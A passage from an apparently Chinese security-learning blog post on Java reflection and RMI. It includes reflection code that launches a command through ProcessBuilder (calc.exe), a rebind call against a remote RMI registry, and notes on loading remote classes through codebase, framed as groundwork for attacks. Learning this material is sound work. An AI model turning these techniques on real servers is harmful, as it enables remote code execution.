class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// String对象:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Hello world&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 获取String substring(int)方法，参数为int:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; String.class.getMethod(&lt;span class=&#34;string&#34;&gt;&amp;quot;substring&amp;quot;&lt;/span&gt;, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 在s对象上调用该方法并获取结果:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (String) m.invoke(s, &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 打印调用结果:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(r);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;调用静态方法&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Main&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 获取Integer.parseInt(String)方法，参数为String:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; Integer.class.getMethod(&lt;span class=&#34;string&#34;&gt;&amp;quot;parseInt&amp;quot;&lt;/span&gt;, String.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 调用该静态方法并获取结果:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Integer&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Integer) m.invoke(&lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;12345&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 打印调用结果:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;调用非 public 方法&lt;/p&gt;
&lt;p&gt;&lt;code&gt; m.setAccessible(true);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;多态：调用子类和父类都存在该方法时，调用子类方法&lt;/p&gt;
&lt;p&gt;如果通过反射来创建新的实例，可以调用 Class 提供的 newInstance () 方法：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Person p = Person.class.newInstance();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;它只能调用该类的 public 无参数构造方法。如果构造方法带有参数，或者不是 public，就无法直接通过 Class.newInstance () 来调用。&lt;/p&gt;
&lt;p&gt;获取有参方法&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Main&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 获取构造方法Integer(int):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Constructor&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;cons1&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; Integer.class.getConstructor(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 调用构造方法:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Integer&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;n1&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Integer) cons1.newInstance(&lt;span class=&#34;number&#34;&gt;123&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(n1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 获取构造方法Integer(String)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Constructor&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;cons2&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; Integer.class.getConstructor(String.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Integer&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;n2&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Integer) cons2.newInstance(&lt;span class=&#34;string&#34;&gt;&amp;quot;456&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(n2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;调用非 &lt;code&gt;public&lt;/code&gt;  的 &lt;code&gt;Constructor&lt;/code&gt;  时，必须首先通过 &lt;code&gt;setAccessible(true)&lt;/code&gt;  设置允许访问。 &lt;code&gt;setAccessible(true)&lt;/code&gt;  可能会失败。&lt;/p&gt;
&lt;p&gt;我们常用的另一种执行命令的方式 ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start () 来执行命令：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Class clazz = Class.forName(&amp;quot;java.lang.ProcessBuilder&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(&amp;quot;calc.exe&amp;quot;))).start();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不用强制类型转换时&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Class clazz = Class.forName(&amp;quot;java.lang.ProcessBuilder&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clazz.getMethod(&amp;quot;start&amp;quot;).invoke(clazz.getConstructor(List.class).newInstance(  Arrays.asList(&amp;quot;calc.exe&amp;quot;)));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;反射可以提供动态特性&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public void execute(String className, String methodName) throws Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Class clazz = Class.forName(className);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clazz.getMethod(methodName).invoke(clazz.newInstance());  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;import java.lang.Runtime;&lt;/code&gt;  该类可以用于执行任意命令&lt;/p&gt;
&lt;p&gt;在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用 forName 就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。&lt;/p&gt;
&lt;h3 id=&#34;rmi&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rmi&#34;&gt;#&lt;/a&gt; RMI&lt;/h3&gt;
&lt;p&gt;RMI 是 Remote Method Invocation 的缩写。&lt;/p&gt;
&lt;p&gt;要实现 RMI，服务器和客户端必须共享同一个接口。我们定义一个 &lt;code&gt;WorldClock&lt;/code&gt;  接口，代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public interface WorldClock extends Remote &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LocalDateTime getLocalDateTime(String zoneId) throws RemoteException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Java 的 RMI 规定此接口必须派生自 &lt;code&gt;java.rmi.Remote&lt;/code&gt; ，并在每个方法声明抛出 &lt;code&gt;RemoteException&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;下一步是编写服务器的实现类，因为客户端请求的调用方法 &lt;code&gt;getLocalDateTime()&lt;/code&gt;  最终会通过这个实现类返回结果。实现类 &lt;code&gt;WorldClockService&lt;/code&gt;  代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public class WorldClockService implements WorldClock &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @Override&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public LocalDateTime getLocalDateTime(String zoneId) throws RemoteException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return LocalDateTime.now(ZoneId.of(zoneId)).withNano(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们需要通过 Java RMI 提供的一系列底层支持接口，把上面编写的服务以 RMI 的形式暴露在网络上，客户端才能调用：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public class Server &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public static void main(String[] args) throws RemoteException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&amp;quot;create World clock remote service...&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 实例化一个WorldClock:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        WorldClock worldClock = new WorldClockService();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 将此服务转换为远程服务接口:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        WorldClock skeleton = (WorldClock) UnicastRemoteObject.exportObject(worldClock, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 将RMI服务注册到1099端口:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Registry registry = LocateRegistry.createRegistry(1099);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 注册此服务，服务名为&amp;quot;WorldClock&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        registry.rebind(&amp;quot;WorldClock&amp;quot;, skeleton);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上述代码主要目的是通过 RMI 提供的相关类，将我们自己的 &lt;code&gt;WorldClock&lt;/code&gt;  实例注册到 RMI 服务上。RMI 的默认端口是 &lt;code&gt;1099&lt;/code&gt; ，最后一步注册服务时通过 &lt;code&gt;rebind()&lt;/code&gt;  指定服务名称为 &lt;code&gt;&amp;quot;WorldClock&amp;quot;&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;下一步我们就可以编写客户端代码。RMI 要求服务器和客户端共享同一个接口，因此我们要把 &lt;code&gt;WorldClock.java&lt;/code&gt;  这个接口文件复制到客户端，然后在客户端实现 RMI 调用：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public class Client &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public static void main(String[] args) throws RemoteException, NotBoundException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 连接到服务器localhost，端口1099:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Registry registry = LocateRegistry.getRegistry(&amp;quot;localhost&amp;quot;, 1099);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 查找名称为&amp;quot;WorldClock&amp;quot;的服务并强制转型为WorldClock接口:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        WorldClock worldClock = (WorldClock) registry.lookup(&amp;quot;WorldClock&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 正常调用接口方法:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        LocalDateTime now = worldClock.getLocalDateTime(&amp;quot;Asia/Shanghai&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 打印调用结果:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(now);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Java 的 RMI 严重依赖序列化和反序列化，而这种情况下可能会造成严重的安全漏洞，因为 Java 的序列化和反序列化不但涉及到数据，还涉及到二进制的字节码，即使使用白名单机制也很难保证 100% 排除恶意构造的字节码。&lt;/p&gt;
&lt;p&gt;这就是完整的通信过程，我们可以发现，整个过程进行了两次 TCP 握手，也就是我们实际建立了两次&lt;br&gt;
 TCP 连接。&lt;br&gt;
第一次建立 TCP 连接是连接远端 192.168.135.142 的 1099 端口，这也是我们在代码里看到的端口，二 者进行沟通后，我向远端发送了一个 “Call” 消息，远端回复了一个 “ReturnData” 消息，然后我新建了一 个 TCP 连接，连到远端的 33769 端口。&lt;/p&gt;
&lt;p&gt;细细阅读数据包我们会发现，在 “ReturnData” 这个包中，返回了目标的 IP 地址 192.168.135.142 ，其 后跟的一个字节 \x00\x00\x83\xE9 ，刚好就是整数 33769 的网络序列：&lt;/p&gt;
&lt;p&gt;首先客户端连接 Registry，并在其中寻找 Name 是 Hello 的对象，这个对应数据 流中的 Call 消息；然后 Registry 返回一个序列化的数据，这个就是找到的 Name=Hello 的对象，这个对应 数据流中的 ReturnData 消息；客户端反序列化该对象，发现该对象是一个远程对象，地址&lt;br&gt;
在 192.168.135.142:33769 ，于是再与这个地址建立 TCP 连接；在这个新的连接中，才执行真正远程 方法调用，也就是 hello () 。&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117161651171.png&#34; alt=&#34;image-20221117161651171&#34; style=&#34;zoom:80%;&#34; /&gt;
&lt;p&gt;RMI Registry 就像一个网关，他自己是不会执行远程方法的，但 RMI Server 可以在上面注册一个 Name  到对象的绑定关系；RMI Client 通过 Name 向 RMI Registry 查询，得到这个绑定关系，然后再连接 RMI  Server；最后，远程方法实际上在 RMI Server 上调用。&lt;/p&gt;
&lt;h3 id=&#34;攻击rmi-registry&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#攻击rmi-registry&#34;&gt;#&lt;/a&gt; 攻击 RMI registry&lt;/h3&gt;
&lt;p&gt;当我们可以访问目标 RMI Registry 的时候&lt;/p&gt;
&lt;p&gt;RMI Registry 是一个远程对象管理的地方，可以理解为一个远程对象的 “后台”。我们可以尝试直 接访问 “后台” 功能，比如修改远程服务器上 Hello 对应的对象：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;RemoteHelloWorld h = new RemoteHelloWorld();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Naming.rebind(&amp;quot;rmi://192.168.135.142:1099/Hello&amp;quot;, h);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Java 对远程访问 RMI Registry 做了限制，只有来源地址是 localhost 的时候，才能调用 rebind、  bind、unbind 等方法。&lt;/p&gt;
&lt;p&gt;codebase 是一个地址，告诉 Java 虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的  CLASSPATH，但 CLASSPATH 是本地路径，而 codebase 通常是远程 URL，比如 http、ftp 等。&lt;br&gt;
如果我们指定 codebase=http://example.com/ ，然后加载 org.vulhub.example.Example 类，则 Java 虚拟机会下载这个文件 &lt;a href=&#34;http://example.com/org/vulhub/example/Example.class&#34;&gt;http://example.com/org/vulhub/example/Example.class&lt;/a&gt; ，并作为 Example 类的字节码。&lt;/p&gt;
&lt;p&gt;RMI 的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻 找类。如果某一端反序列化时发现一个对象，那么就会去自己的 CLASSPATH 下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载 codebase 中的类。&lt;/p&gt;
